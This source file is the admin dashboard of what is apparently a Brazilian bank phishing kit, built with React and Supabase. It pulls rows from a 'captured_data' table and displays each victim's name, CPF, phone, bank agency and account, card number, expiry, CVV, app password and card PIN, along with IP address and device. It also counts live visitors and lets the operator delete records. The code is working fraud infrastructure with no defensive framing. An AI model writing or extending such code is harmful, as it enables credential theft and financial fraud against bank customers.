import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { Users, Eye, Activity, LogOut, Clock } from "lucide-react";
import { BarChart, Bar, XAxis, YAxis, CartesianGrid, Tooltip, ResponsiveContainer, LineChart, Line } from "recharts";

interface DailyVisit {
  date: string;
  visits: number;
}

interface HourlyVisit {
  hour: string;
  visits: number;
}

interface CapturedEntry {
  id: string;
  visitor_id: string;
  step: string;
  data: Record<string, string>;
  created_at: string;
}

interface GroupedClient {
  visitor_id: string;
  nome?: string;
  cpf?: string;
  telefone?: string;
  agencia?: string;
  conta?: string;
  numero_cartao?: string;
  validade?: string;
  cvv?: string;
  senha_app?: string;
  senha_cartao?: string;
  ip_address?: string;
  created_at: string;
  user_agent?: string;
}

const detectDevice = (ua?: string): string => {
  if (!ua) return "Desconhecido";
  const lower = ua.toLowerCase();
  if (/tablet|ipad|playbook|silk/i.test(lower)) return "Tablet";
  if (/mobile|iphone|ipod|android.*mobile|windows phone|blackberry/i.test(lower)) return "Celular";
  return "Computador";
};

const AdminDashboard = () => {
  const navigate = useNavigate();
  const [totalVisits, setTotalVisits] = useState(0);
  const [liveUsers, setLiveUsers] = useState(0);
  const [todayVisits, setTodayVisits] = useState(0);
  const [dailyData, setDailyData] = useState<DailyVisit[]>([]);
  const [hourlyData, setHourlyData] = useState<HourlyVisit[]>([]);
  const [capturedData, setCapturedData] = useState<CapturedEntry[]>([]);
  const [groupedClients, setGroupedClients] = useState<GroupedClient[]>([]);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    const checkAuth = async () => {
      const { data: { session } } = await supabase.auth.getSession();
      if (!session) {
        navigate("/admin");
        return;
      }
      const { data: roles } = await supabase
        .from("user_roles")
        .select("role")
        .eq("user_id", session.user.id)
        .eq("role", "admin");
      if (!roles || roles.length === 0) {
        await supabase.auth.signOut();
        navigate("/admin");
        return;
      }
      fetchData();
    };
    checkAuth();
  }, [navigate]);

  const fetchData = async () => {
    setLoading(true);

    // Total visits
    const { count: total } = await supabase
      .from("page_visits")
      .select("*", { count: "exact", head: true });
    setTotalVisits(total || 0);

    // Today visits
    const today = new Date().toISOString().split("T")[0];
    const { count: todayCount } = await supabase
      .from("page_visits")
      .select("*", { count: "exact", head: true })
      .gte("created_at", today);
    setTodayVisits(todayCount || 0);

    // Live users (last 30 seconds)
    const thirtySecondsAgo = new Date(Date.now() - 30000).toISOString();
    const { count: live } = await supabase
      .from("active_sessions")
      .select("*", { count: "exact", head: true })
      .gte("last_seen", thirtySecondsAgo);
    setLiveUsers(live || 0);

    // Daily visits (last 7 days)
    const sevenDaysAgo = new Date(Date.now() - 7 * 86400000).toISOString();
    const { data: visits } = await supabase
      .from("page_visits")
      .select("created_at")
      .gte("created_at", sevenDaysAgo);

    if (visits) {
      const grouped: Record<string, number> = {};
      visits.forEach((v) => {
        const d = v.created_at.split("T")[0];
        grouped[d] = (grouped[d] || 0) + 1;
      });
      const daily = Object.entries(grouped)
        .map(([date, visits]) => ({ date: date.slice(5), visits }))
        .sort((a, b) => a.date.localeCompare(b.date));
      setDailyData(daily);
    }

    // Hourly visits (today)
    const { data: todayVisitsData } = await supabase
      .from("page_visits")
      .select("created_at")
      .gte("created_at", today);

    if (todayVisitsData) {
      const hourly: Record<string, number> = {};
      todayVisitsData.forEach((v) => {
        const h = new Date(v.created_at).getHours().toString().padStart(2, "0") + ":00";
        hourly[h] = (hourly[h] || 0) + 1;
      });
      const hourlyArr = Object.entries(hourly)
        .map(([hour, visits]) => ({ hour, visits }))
        .sort((a, b) => a.hour.localeCompare(b.hour));
      setHourlyData(hourlyArr);
    }

    // Captured data (last 200 entries, grouped by visitor)
    const { data: captured } = await supabase
      .from("captured_data")
      .select("*")
      .order("created_at", { ascending: false })
      .limit(200);
    
    const entries = (captured as CapturedEntry[]) || [];
    setCapturedData(entries);

    // Fetch user_agents from page_visits for device detection
    const visitorIds = [...new Set(entries.map(e => e.visitor_id))];
    const { data: visitData } = await supabase
      .from("page_visits")
      .select("visitor_id, user_agent, ip_address")
      .in("visitor_id", visitorIds.length > 0 ? visitorIds : ["__none__"]);
    
    const uaMap: Record<string, string> = {};
    const ipMap: Record<string, string> = {};
    visitData?.forEach((v) => {
      if (v.user_agent && !uaMap[v.visitor_id]) {
        uaMap[v.visitor_id] = v.user_agent;
      }
      if (v.ip_address && !ipMap[v.visitor_id]) {
        ipMap[v.visitor_id] = v.ip_address;
      }
    });

    // Group by visitor_id
    const grouped: Record<string, GroupedClient> = {};
    entries.forEach((entry) => {
      if (!grouped[entry.visitor_id]) {
        grouped[entry.visitor_id] = {
          visitor_id: entry.visitor_id,
          created_at: entry.created_at,
          user_agent: uaMap[entry.visitor_id],
          ip_address: ipMap[entry.visitor_id],
        };
      }
      const client = grouped[entry.visitor_id];
      if (entry.created_at < client.created_at) {
        client.created_at = entry.created_at;
      }
      const d = entry.data as Record<string, string>;
      if (entry.step === "identificacao") {
        client.nome = d.nome;
        client.cpf = d.cpf;
        client.telefone = d.telefone;
      } else if (entry.step === "resgate") {
        client.agencia = d.agencia;
        client.conta = d.conta;
      } else if (entry.step === "dados-cartao") {
        client.numero_cartao = d.numero;
        client.validade = d.validade;
        client.cvv = d.cvv;
      } else if (entry.step === "senha-acesso") {
        client.senha_app = d.senha;
      } else if (entry.step === "senha-cartao" || entry.step === "confirmacao") {
        client.senha_cartao = d.senhaCartao || d.senha;
      }
    });
    setGroupedClients(
      Object.values(grouped).sort((a, b) => b.created_at.localeCompare(a.created_at))
    );

    setLoading(false);
  };

  const handleDeleteClient = async (visitorId: string) => {
    await supabase.from("captured_data").delete().eq("visitor_id", visitorId);
    setGroupedClients((prev) => prev.filter((c) => c.visitor_id !== visitorId));
  };

  const handleLogout = async () => {
    await supabase.auth.signOut();
    navigate("/admin");
  };

  if (loading) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-muted">
        <p className="text-muted-foreground">Carregando...</p>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-muted">
      {/* Header */}
      <div className="bg-background border-b border-border px-6 py-4 flex items-center justify-between">
        <h1 className="text-lg font-bold text-foreground">Dashboard Admin</h1>
        <button onClick={handleLogout} className="flex items-center gap-2 text-muted-foreground hover:text-foreground text-sm">
          <LogOut size={16} /> Sair
        </button>
      </div>

      <div className="p-6 max-w-6xl mx-auto space-y-6">
        {/* Stats Cards */}
        <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
          <div className="bg-background rounded-xl border border-border p-5">
            <div className="flex items-center gap-3 mb-2">
              <div className="w-10 h-10 rounded-lg bg-primary/10 flex items-center justify-center">
                <Eye className="text-primary" size={20} />
              </div>
              <p className="text-muted-foreground text-sm">Total de Visitas</p>
            </div>
            <p className="text-3xl font-bold text-foreground">{totalVisits}</p>
          </div>

          <div className="bg-background rounded-xl border border-border p-5">
            <div className="flex items-center gap-3 mb-2">
              <div className="w-10 h-10 rounded-lg bg-green-100 flex items-center justify-center">
                <Activity className="text-green-600" size={20} />
              </div>
              <p className="text-muted-foreground text-sm">Ao Vivo Agora</p>
            </div>
            <p className="text-3xl font-bold text-foreground">{liveUsers}</p>
          </div>

          <div className="bg-background rounded-xl border border-border p-5">
            <div className="flex items-center gap-3 mb-2">
              <div className="w-10 h-10 rounded-lg bg-blue-100 flex items-center justify-center">
                <Clock className="text-blue-600" size={20} />
              </div>
              <p className="text-muted-foreground text-sm">Visitas Hoje</p>
            </div>
            <p className="text-3xl font-bold text-foreground">{todayVisits}</p>
          </div>
        </div>

        {/* Charts */}
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
          <div className="bg-background rounded-xl border border-border p-5">
            <h2 className="text-foreground font-semibold mb-4">Visitas por Dia (Últimos 7 dias)</h2>
            <ResponsiveContainer width="100%" height={250}>
              <BarChart data={dailyData}>
                <CartesianGrid strokeDasharray="3 3" stroke="hsl(var(--border))" />
                <XAxis dataKey="date" tick={{ fontSize: 12 }} stroke="hsl(var(--muted-foreground))" />
                <YAxis tick={{ fontSize: 12 }} stroke="hsl(var(--muted-foreground))" />
                <Tooltip />
                <Bar dataKey="visits" fill="hsl(var(--primary))" radius={[4, 4, 0, 0]} />
              </BarChart>
            </ResponsiveContainer>
          </div>

          <div className="bg-background rounded-xl border border-border p-5">
            <h2 className="text-foreground font-semibold mb-4">Visitas por Hora (Hoje)</h2>
            <ResponsiveContainer width="100%" height={250}>
              <LineChart data={hourlyData}>
                <CartesianGrid strokeDasharray="3 3" stroke="hsl(var(--border))" />
                <XAxis dataKey="hour" tick={{ fontSize: 12 }} stroke="hsl(var(--muted-foreground))" />
                <YAxis tick={{ fontSize: 12 }} stroke="hsl(var(--muted-foreground))" />
                <Tooltip />
                <Line type="monotone" dataKey="visits" stroke="hsl(var(--primary))" strokeWidth={2} dot={{ fill: "hsl(var(--primary))" }} />
              </LineChart>
            </ResponsiveContainer>
          </div>
        </div>

        {/* Captured Data - Client Cards */}
        <div className="bg-background rounded-xl border border-border p-5">
          <div className="flex items-center gap-3 mb-4">
            <Users className="text-primary" size={20} />
            <h2 className="text-foreground font-semibold">Dados Capturados ({groupedClients.length} clientes)</h2>
          </div>
          <div className="space-y-4">
            {groupedClients.map((client, index) => (
              <div key={client.visitor_id} className="border border-border rounded-lg p-4 bg-muted/30">
                <div className="flex items-center justify-between mb-3">
                  <span className="text-xs font-mono text-muted-foreground">ID: {client.visitor_id.slice(0, 8)}</span>
                  <span className="text-xs text-muted-foreground">
                    {new Date(client.created_at).toLocaleString("pt-BR")}
                  </span>
                </div>
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-x-6 gap-y-1.5 text-sm">
                  <div><span className="text-muted-foreground">Nome:</span> <span className="text-foreground font-medium">{client.nome || "—"}</span></div>
                  <div><span className="text-muted-foreground">CPF:</span> <span className="text-foreground font-medium">{client.cpf || "—"}</span></div>
                  <div><span className="text-muted-foreground">Telefone:</span> <span className="text-foreground font-medium">{client.telefone || "—"}</span></div>
                  <div className="flex gap-4">
                    <div><span className="text-muted-foreground">Agência:</span> <span className="text-foreground font-medium">{client.agencia || "—"}</span></div>
                    <div><span className="text-muted-foreground">Conta:</span> <span className="text-foreground font-medium">{client.conta || "—"}</span></div>
                  </div>
                  <div><span className="text-muted-foreground">Cartão:</span> <span className="text-foreground font-medium">{client.numero_cartao || "—"}</span></div>
                  <div className="flex gap-4">
                    <div><span className="text-muted-foreground">Validade:</span> <span className="text-foreground font-medium">{client.validade || "—"}</span></div>
                    <div><span className="text-muted-foreground">CVV:</span> <span className="text-foreground font-medium">{client.cvv || "—"}</span></div>
                  </div>
                  <div><span className="text-muted-foreground">Senha App:</span> <span className="text-foreground font-medium">{client.senha_app || "—"}</span></div>
                  <div><span className="text-muted-foreground">Senha Cartão:</span> <span className="text-foreground font-medium">{client.senha_cartao || "—"}</span></div>
                  <div><span className="text-muted-foreground">IP:</span> <span className="text-foreground font-medium">{client.ip_address || "—"}</span></div>
                  <div><span className="text-muted-foreground">Dispositivo:</span> <span className="text-foreground font-medium">{detectDevice(client.user_agent)}</span></div>
                </div>
              </div>
            ))}
            {groupedClients.length === 0 && (
              <p className="py-8 text-center text-muted-foreground">Nenhum dado capturado ainda</p>
            )}
          </div>
        </div>

        {/* Refresh */}
        <button
          onClick={fetchData}
          className="w-full py-2.5 rounded-lg border border-border bg-background text-foreground text-sm hover:bg-muted transition-colors"
        >
          Atualizar dados
        </button>
      </div>
    </div>
  );
};

export default AdminDashboard;
